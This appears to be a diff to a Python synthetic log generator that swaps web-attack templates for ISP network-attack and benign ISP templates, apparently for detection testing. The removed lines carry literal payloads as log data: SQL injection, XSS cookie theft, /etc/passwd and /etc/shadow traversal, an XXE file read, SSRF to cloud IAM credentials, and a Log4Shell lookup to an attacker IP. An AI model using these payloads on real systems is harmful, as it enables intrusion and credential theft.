@@ -25,82 +25,86 @@ def _random_ip():
 def _internal_ip():
     return f"192.168.{random.randint(1, 10)}.{random.randint(2, 200)}"
 
-# All attack templates with metadata for diverse simulation
+# ISP-specific attack templates focused on network-level threats
 ATTACK_TEMPLATES = [
-    # ── WEB APPLICATION ATTACKS ─────────────────────────────
-    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /index.php?id=1 UNION SELECT username,password FROM users-- HTTP/1.1" 200 4500',
-    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "POST /login HTTP/1.1" 200 1200 body="username=admin\' OR 1=1--&password=foo"',
-    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /search?q=<script>document.cookie=\'stolen=\'+document.cookie</script> HTTP/1.1" 200 900',
-    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /page?url=javascript:alert(1) HTTP/1.1" 200 512',
-    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /download?file=../../../../etc/passwd HTTP/1.1" 200 2048',
-    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /view?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fshadow HTTP/1.1" 403 0',
-    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1" 200 1500',
-    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "POST /api/xml HTTP/1.1" 500 200 body="<!DOCTYPE foo [<!ENTITY xxe SYSTEM \'file:///etc/passwd\'>]>"',
-    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /render?template={{{{7*7}}}} HTTP/1.1" 200 300',
-    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "POST /api/deserialize HTTP/1.1" 500 200 body="rO0ABXNyAA1qYXZhLnV0aWwuTWFw"',
-    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /api/data?id=1 HTTP/1.1" 200 12000 Transfer-Encoding: chunked Content-Length: 0',
-    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /api/users?limit=10000 HTTP/1.1" 200 8888',
-    # ── LOG4SHELL / KNOWN CVE ────────────────────────────────
-    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET / HTTP/1.1" 200 1024 User-Agent: ${{jndi:ldap://{ip}:1389/exploit}}',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"ERROR\", \"message\": \"Log4Shell payload detected in header: ${{jndi:dns://{ip}/CVE-2021-44228}}\"}}',
-    # ── AUTHENTICATION ATTACKS ────────────────────────────────
-    lambda ip, dt: f'{dt.strftime("%b %d %H:%M:%S")} webserver sshd[{random.randint(1000,9999)}]: Failed password for invalid user admin from {ip} port {random.randint(1024,65535)} ssh2',
-    lambda ip, dt: f'{dt.strftime("%b %d %H:%M:%S")} webserver sshd[{random.randint(1000,9999)}]: Failed password for root from {ip} port {random.randint(1024,65535)} ssh2',
-    lambda ip, dt: f'{dt.isoformat()}Z ERROR auth - Authentication failure: max auth attempts exceeded for user admin from {ip}',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"WARN\", \"message\": \"Password spraying detected: 50 accounts failed login from {ip} in 30 seconds\"}}',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"WARN\", \"message\": \"OAuth token reuse detected: bearer token misuse from {ip}\"}}',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"Credential exposure in logs: password=P@ssw0rd123 for user svcadmin\"}}',
-    lambda ip, dt: f'{dt.isoformat()}Z CRITICAL app - Credential dumping detected: lsass.exe memory access by unknown process from {ip}',
-    lambda ip, dt: f'{dt.isoformat()}Z WARN app - Forged JWT token detected from {ip}: signature mismatch on bearer token',
-    # ── PRIVILEGE ESCALATION ──────────────────────────────────
-    lambda ip, dt: f'{dt.strftime("%b %d %H:%M:%S")} server sudo:    www-data : TTY=pts/0 ; PWD=/var/www ; USER=root ; COMMAND=/bin/bash',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"Container escape detected: docker.sock mounted and accessed from container PID 1\"}}',
-    lambda ip, dt: f'{dt.isoformat()}Z CRITICAL kernel - DirtyCow exploit attempt detected from process PID {random.randint(1000,9999)}',
-    lambda ip, dt: f'{dt.isoformat()}Z WARN sudo - pkexec privilege escalation: unauthorized attempt from {ip}',
-    lambda ip, dt: f'{dt.isoformat()}Z CRITICAL sec - Kernel exploit: perf_event_open local privilege escalation attempt from user www-data',
-    # ── NETWORK ATTACKS ───────────────────────────────────────
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"WARN\", \"message\": \"Port scan detected: nmap SYN scan from {ip} - 1024 ports scanned in 2s\"}}',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"DDoS: SYN flood from {ip} — 80,000 packets/second detected, connection limit reached\"}}',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"HIGH\", \"message\": \"ARP poisoning detected: ARP spoof from {ip} on internal subnet 192.168.1.0/24\"}}',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"HIGH\", \"message\": \"DNS tunneling: unusually long DNS query from {ip} — base64 encoded payload in subdomain\"}}',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"Lateral movement: pass-the-hash from {ip} to 192.168.1.20 via SMB\"}}',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"HIGH\", \"message\": \"TLS downgrade attack detected: SSL strip attempt from {ip} — certificate mismatch\"}}',
-    # ── MALWARE & EXECUTION ───────────────────────────────────
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"Ransomware encryption detected in /home/user/docs — files renamed to .encrypted\"}}',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"Cryptominer detected: xmrig process connecting to stratum+tcp://pool.minexmr.com:4444\"}}',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"C2 beacon detected: reverse shell callback to {ip}:4444 — backdoor installed\"}}',
-    lambda ip, dt: f'{dt.isoformat()}Z CRITICAL sec - Fileless malware: powershell -EncodedCommand aQBlAHgAIA... executed in memory',
-    lambda ip, dt: f'{dt.isoformat()}Z CRITICAL sec - Persistence mechanism: new systemd service created by www-data in /etc/systemd/system/',
-    lambda ip, dt: f'{dt.isoformat()}Z WARN sec - LOLBin abuse: certutil -decode dropping payload to C:\\Windows\\Temp\\malware.exe',
+    # ── NETWORK SCANNING & RECONNAISSANCE ─────────────────────
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "WARN", "message": "Port scan detected: nmap SYN scan from {ip} - 1024 ports scanned in 2s"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "WARN", "message": "Network reconnaissance: masscan detected from {ip} targeting ISP subnet 10.0.0.0/8"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "Service enumeration: {ip} probing multiple ports (21,22,23,80,443,3389) on customer network"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "WARN", "message": "DNS zone transfer attempt from {ip} - AXFR query blocked"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "WARN", "message": "SNMP community string brute force from {ip} against ISP infrastructure"}}',
+    # ── DDoS ATTACKS ──────────────────────────────────────────
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "CRITICAL", "message": "DDoS: SYN flood from {ip} — 80,000 packets/second detected, connection limit reached"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "CRITICAL", "message": "DDoS: UDP amplification attack from {ip} — DNS reflection, 500x amplification factor"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "CRITICAL", "message": "DDoS: NTP monlist amplification from {ip} — 47x amplification detected"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "CRITICAL", "message": "DDoS: HTTP flood from botnet {ip} — 10,000 requests/second to customer web server"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "Volumetric attack: ICMP flood from {ip} saturating ISP backbone link"}}',
+    # ── DNS ATTACKS ───────────────────────────────────────────
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "DNS tunneling: unusually long DNS query from {ip} — base64 encoded payload in subdomain"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "CRITICAL", "message": "DNS cache poisoning attempt from {ip} — spoofed DNS response detected"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "DNS water torture attack from {ip} — random subdomain flooding"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "WARN", "message": "DNS rebinding attack detected from {ip} — malicious DNS server response"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "DNS DDoS: NXDOMAIN flood from {ip} — 50,000 queries/second to non-existent domains"}}',
+    # ── BOTNET & C2 TRAFFIC ───────────────────────────────────
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "CRITICAL", "message": "C2 beacon detected: reverse shell callback to {ip}:4444 — backdoor installed"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "CRITICAL", "message": "Botnet activity: Mirai botnet C2 communication from {ip} — IoT device compromise"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "P2P botnet traffic detected from {ip} — Emotet C2 communication pattern"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "CRITICAL", "message": "Cryptominer detected: xmrig process connecting to stratum+tcp://pool.minexmr.com:4444"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "Tor exit node traffic detected from {ip} — anonymizer in use for C2 communications"}}',
+    # ── MALWARE DISTRIBUTION ─────────────────────────────────
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "CRITICAL", "message": "Malware distribution: {ip} serving Emotet payload via HTTP download"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "CRITICAL", "message": "Ransomware encryption detected in /home/user/docs — files renamed to .encrypted"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "Fileless malware: powershell -EncodedCommand aQBlAHgAIA... executed in memory"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "LOLBin abuse: certutil -decode dropping payload to C:\\Windows\\Temp\\malware.exe"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "CRITICAL", "message": "Worm propagation: SMB exploit EternalBlue from {ip} — WannaCry-like activity"}}',
     # ── DATA EXFILTRATION ─────────────────────────────────────
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"Data exfiltration detected: 2.4GB outbound transfer to {ip} on port 443\"}}',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"Database dump detected: mysqldump executed by app user — 50,000 rows exported\"}}',
-    # ── CLOUD / INFRASTRUCTURE ────────────────────────────────
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"Cloud metadata abuse: 169.254.169.254 IMDSv1 request from container {ip} — IAM credentials exposed\"}}',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"K8s API abuse: unauthorized kubectl exec to kube-apiserver from {ip} — ClusterRoleBinding created\"}}',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"HIGH\", \"message\": \"IAM policy abuse: unauthorized assume role STS GetSessionToken for AdminAccess from {ip}\"}}',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"HIGH\", \"message\": \"S3 public access: bucket policy modified to public-read — sensitive data now exposed\"}}',
-    # ── DEFENSE EVASION ───────────────────────────────────────
-    lambda ip, dt: f'{dt.isoformat()}Z CRITICAL sec - Log tampering: wevtutil cl Security — event log cleared by unknown process',
-    lambda ip, dt: f'{dt.isoformat()}Z CRITICAL sec - Firewall disabled: iptables -F executed — all firewall rules flushed from {ip}',
-    lambda ip, dt: f'{dt.isoformat()}Z CRITICAL sec - Anomalous process injection: CreateRemoteThread into explorer.exe from unknown parent',
-    lambda ip, dt: f'{dt.isoformat()}Z WARN sec - SSH key tampering: authorized_keys modified in /root/.ssh/ by www-data user',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"HIGH\", \"message\": \"Tor exit node traffic detected from {ip} — anonymizer in use for C2 communications\"}}',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"CRITICAL\", \"message\": \"Supply chain attack: malicious npm package installed — dependency confusion detected\"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "CRITICAL", "message": "Data exfiltration detected: 2.4GB outbound transfer to {ip} on port 443"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "CRITICAL", "message": "Database dump detected: mysqldump executed by app user — 50,000 rows exported"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "Large file transfer: 10GB upload from {ip} to cloud storage — potential exfiltration"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "Covert channel: ICMP tunneling detected from {ip} — data exfiltration via ping packets"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "CRITICAL", "message": "Steganography: suspicious image uploads from {ip} — hidden data detected"}}',
+    # ── PHISHING & CREDENTIAL THEFT ───────────────────────────
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "Phishing kit detected: {ip} hosting credential harvesting page mimicking bank login"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "Credential dumping detected: lsass.exe memory access by unknown process from {ip}"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "WARN", "message": "Password spraying detected: 50 accounts failed login from {ip} in 30 seconds"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "Brute-force authentication: SSH login attempts from {ip} — 1000 failed attempts in 5 minutes"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "CRITICAL", "message": "Credential exposure in logs: password=P@ssw0rd123 for user svcadmin"}}',
+    # ── NETWORK INFRASTRUCTURE ATTACKS ───────────────────────
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "ARP poisoning detected: ARP spoof from {ip} on internal subnet 192.168.1.0/24"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "CRITICAL", "message": "BGP hijacking attempt: suspicious route announcement from {ip} — prefix hijack detected"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "Man-in-the-Middle (MitM): SSL strip attempt from {ip} — certificate mismatch"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "Lateral movement: pass-the-hash from {ip} to 192.168.1.20 via SMB"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "CRITICAL", "message": "Router compromise: unauthorized configuration change on ISP edge router from {ip}"}}',
+    # ── ISP-SPECIFIC ABUSE ────────────────────────────────────
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "Spam campaign: {ip} sending 10,000 emails in 1 hour — spam botnet detected"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "WARN", "message": "Port forwarding abuse: {ip} exposing internal services via UPnP"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "Proxy abuse: open proxy detected on {ip} — being used for malicious traffic"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "WARN", "message": "Copyright infringement: torrent traffic from {ip} — DMCA violation detected"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "Account sharing: multiple simultaneous logins from different IPs for same customer account"}}',
+    # ── VOIP & TELEPHONY ATTACKS ─────────────────────────────
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "CRITICAL", "message": "VoIP fraud: SIP trunk abuse from {ip} — international toll fraud detected"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "TDoS attack: Telephony Denial of Service from {ip} — 1000 calls/minute to customer PBX"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "WARN", "message": "SIP registration attack: brute-force SIP credentials from {ip}"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "Eavesdropping: SIP INVITE with malformed headers from {ip} — call interception attempt"}}',
+    # ── IOT & SMART HOME ATTACKS ──────────────────────────────
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "IoT botnet: Mirai infection on customer device {ip} — default credentials exploited"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "WARN", "message": "Smart home abuse: unauthorized access to customer IoT hub from {ip}"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "HIGH", "message": "CCTV camera compromise: {ip} accessing customer camera feed without authorization"}}',
+    lambda ip, dt: f'{{"timestamp": "{dt.isoformat()}Z", "level": "WARN", "message": "Smart meter tampering: unusual power consumption pattern from {ip} — potential fraud"}}',
 ]
 
-# Normal benign log templates
+# Normal benign ISP log templates
 BENIGN_TEMPLATES = [
-    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /index.html HTTP/1.1" 200 {random.randint(1000, 8000)}',
-    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "POST /api/login HTTP/1.1" 200 {random.randint(200, 1200)}',
-    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /static/app.js HTTP/1.1" 304 0',
-    lambda ip, dt: f'{ip} - - [{dt.strftime("%d/%b/%Y:%H:%M:%S +0000")}] "GET /api/health HTTP/1.1" 200 25',
-    lambda ip, dt: f'{dt.isoformat()}Z INFO app - User {random.choice(["alice","bob","charlie","dave"])} logged in successfully from {ip}',
-    lambda ip, dt: f'{dt.isoformat()}Z INFO app - Scheduled backup completed in {random.randint(10,300)}s',
-    lambda ip, dt: f'{dt.strftime("%b %d %H:%M:%S")} server sshd[{random.randint(1000,9999)}]: Accepted publickey for deploy from {ip} port {random.randint(1024,65535)} ssh2',
-    lambda ip, dt: f'{dt.strftime("%b %d %H:%M:%S")} server cron[{random.randint(100,999)}]: (root) CMD (/usr/bin/certbot renew --quiet)',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"INFO\", \"service\": \"api-gateway\", \"message\": \"Request completed\", \"status\": 200, \"latency_ms\": {random.randint(5,200)}}}',
-    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"DEBUG\", \"message\": \"Cache hit for key user_session_{random.randint(1000,9999)}\"}}',
+    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"INFO\", \"service\": \"dhcp\", \"message\": \"DHCP lease assigned to {ip}\", \"lease_time\": 86400}}',
+    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"INFO\", \"service\": \"dns\", \"message\": \"DNS query resolved\", \"query\": \"example.com\", \"response_ip\": \"93.184.216.34\"}}',
+    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"INFO\", \"service\": \"routing\", \"message\": \"BGP route update received\", \"prefix\": \"192.0.2.0/24\", \"as_path\": \"64512 64513\"}}',
+    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"INFO\", \"service\": \"firewall\", \"message\": \"Connection allowed\", \"src_ip\": \"{ip}\", \"dst_port\": 443, \"protocol\": \"TCP\"}}',
+    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"INFO\", \"service\": \"bandwidth\", \"message\": \"Bandwidth usage normal\", \"customer_id\": {random.randint(1000,9999)}, \"usage_mbps\": {random.uniform(10,100)}}}',
+    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"INFO\", \"service\": \"voip\", \"message\": \"SIP call established\", \"caller\": \"{ip}\", \"duration\": {random.randint(60,3600)}}}',
+    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"DEBUG\", \"service\": \"network\", \"message\": \"ICMP ping response\", \"src_ip\": \"{ip}\", \"rtt_ms\": {random.uniform(1,50)}}}',
+    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"INFO\", \"service\": \"proxy\", \"message\": \"HTTP proxy request\", \"client_ip\": \"{ip}\", \"target\": \"example.com\", \"status\": 200}}',
+    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"INFO\", \"service\": \"email\", \"message\": \"SMTP connection established\", \"client_ip\": \"{ip}\", \"emails_sent\": {random.randint(1,10)}}}',
+    lambda ip, dt: f'{{\"timestamp\": \"{dt.isoformat()}Z\", \"level\": \"INFO\", \"service\": \"iot\", \"message\": \"IoT device heartbeat\", \"device_ip\": \"{ip}\", \"device_type\": \"smart_thermostat\"}}',
 ]
 
 
